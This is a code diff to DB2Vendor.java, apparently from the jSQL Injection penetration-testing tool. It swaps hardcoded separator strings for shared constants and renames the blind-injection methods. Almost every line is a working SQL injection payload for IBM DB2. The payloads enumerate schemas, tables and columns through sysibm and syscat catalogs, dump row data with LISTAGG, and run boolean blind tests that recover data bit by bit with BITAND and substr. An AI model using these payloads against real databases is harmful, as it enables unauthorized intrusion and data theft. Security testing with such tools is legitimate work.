@@ -1,5 +1,9 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -8,12 +12,12 @@ import com.jsql.model.bean.database.Database;
 import com.jsql.model.bean.database.Table;
 import com.jsql.util.StringUtil;
 
-public class DB2Vendor extends AbstractVendor {
+public class DB2Vendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
         return
-            "select+versionnumber||'%04'||current+server||'%04'||user||'%01%03%03%07'from+sysibm.sysversions";
+            "select+versionnumber||'"+ SEPARATOR_SQL +"'||current+server||'"+ SEPARATOR_SQL +"'||user||'"+ TRAIL_SQL +"'from+sysibm.sysversions";
     }
 
     @Override
@@ -22,7 +26,7 @@ public class DB2Vendor extends AbstractVendor {
             /**
              * First substr(,3) remove 'gg' at the beginning
              */
-            "select+varchar(LISTAGG('%04'||trim(schemaname)||'%050%04')||'%01%03%03%07')from+syscat.schemata{limit}";
+            "select+varchar(LISTAGG('"+ SEPARATOR_SQL +"'||trim(schemaname)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"')||'"+ TRAIL_SQL +"')from+syscat.schemata{limit}";
     }
 
     @Override
@@ -31,13 +35,13 @@ public class DB2Vendor extends AbstractVendor {
             /**
              * First substr(,3) remove 'gg' at the beginning
              */
-            "select+varchar(LISTAGG('%04'||trim(name)||'%050%04')||'%01%03%03%07')from+sysibm.systables+where+creator='"+database+"'{limit}";
+            "select+varchar(LISTAGG('"+ SEPARATOR_SQL +"'||trim(name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"')||'"+ TRAIL_SQL +"')from+sysibm.systables+where+creator='"+database+"'{limit}";
     }
 
     @Override
     public String getSqlColumns(Table table) {
         return
-            "select+varchar(LISTAGG('%04'||trim(name)||'%050%04')||'%01%03%03%07')from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'{limit}";
+            "select+varchar(LISTAGG('"+ SEPARATOR_SQL +"'||trim(name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"')||'"+ TRAIL_SQL +"')from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'{limit}";
     }
 
     @Override
@@ -55,7 +59,7 @@ public class DB2Vendor extends AbstractVendor {
              * LISTAGG limit is 4000 and aggregate all data before limit is applied
              * => subquery
              */
-            "select+varchar(LISTAGG('%04'||s||'%051%04')||'%01%03%03%07')from(select+" + formatListColumn + "s+from+" + database + "." + table + "{limit})";
+            "select+varchar(LISTAGG('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"1"+ SEPARATOR_SQL +"')||'"+ TRAIL_SQL +"')from(select+" + formatListColumn + "s+from+" + database + "." + table + "{limit})";
     }
 
     @Override
@@ -69,27 +73,27 @@ public class DB2Vendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlBlindFirstTest() {
+    public String sqlTestBlindFirst() {
         return "0%2b1=1";
     }
 
     @Override
-    public String getSqlBlindCheck(String check) {
+    public String sqlTestBlind(String check) {
         return "+and+" + check + "--+";
     }
 
     @Override
-    public String getSqlBlindBitCheck(String inj, int indexCharacter, int bit) {
+    public String sqlBitTestBlind(String inj, int indexCharacter, int bit) {
         return "+and+0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + ")--+";
     }
 
     @Override
-    public String getSqlBlindLengthCheck(String inj, int indexCharacter) {
+    public String sqlLengthTestBlind(String inj, int indexCharacter) {
         return "+and+length(" + inj + ")>" + indexCharacter + "--+";
     }
     
     @Override
-    public String getSqlBlind(String sqlQuery, String startPosition) {
+    public String sqlBlind(String sqlQuery, String startPosition) {
         return
             "(select+" +
                 /**
@@ -98,7 +102,7 @@ public class DB2Vendor extends AbstractVendor {
                 "varchar(replace('SQLi'||substr(" +
                     "(" + sqlQuery + ")," +
                     startPosition +
-                "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
+                "),'SQLi"+ TRAIL_SQL +"','SQLi'))+from+sysibm.sysdummy1)";
     }
 
     @Override
@@ -111,7 +115,7 @@ public class DB2Vendor extends AbstractVendor {
             "varchar(replace('SQLi'||substr(" +
                 "(" + sqlQuery + ")," +
                 startPosition +
-            "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
+            "),'SQLi"+ TRAIL_SQL +"','SQLi'))+from+sysibm.sysdummy1)";
     }
 
     @Override
